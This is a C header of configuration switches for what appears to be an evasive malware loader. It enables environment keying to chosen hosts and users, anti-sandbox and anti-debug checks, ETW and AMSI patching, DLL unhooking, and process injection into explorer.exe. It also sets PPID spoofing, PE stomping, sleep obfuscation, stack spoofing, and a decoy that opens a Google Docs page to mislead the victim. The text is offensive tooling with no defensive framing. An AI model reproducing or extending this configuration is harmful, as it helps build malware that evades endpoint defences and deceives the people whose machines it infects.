#pragma once
#define ENABLE_ENV_KEYING        1
#define ENABLE_ANTI_SANDBOX      1
#define ENABLE_ANTI_DEBUG        1
#define ENABLE_DELAY_EXEC        0
#define DELAY_SECONDS            300
#define ENABLE_ETW_PATCH         1
#define ENABLE_AMSI_PATCH        1
#define ENABLE_UNHOOK            1
#define UNHOOK_METHOD_KNOWNDLLS  1
#define INJECT_SELF              1
#define INJECT_REMOTE            0
#define INJECT_MODULE_STOMP      0
#define REMOTE_PROCESS           "explorer.exe"
#define ENABLE_PPID_SPOOF        0
#define PPID_PARENT              "explorer.exe"
#define ENABLE_PE_STOMP          1
#define ENABLE_SLEEP_OBFUSCATION 1
#define ENABLE_STACK_SPOOF       1
#define USE_RC4                  0
#define TARGET_HOSTNAME          ""
#define TARGET_USERNAME          ""
#define TARGET_DOMAIN            ""
#define ENABLE_DECOY             1
#define DECOY_APP                "rundll32 url.dll,FileProtocolHandler https://docs.google.com"
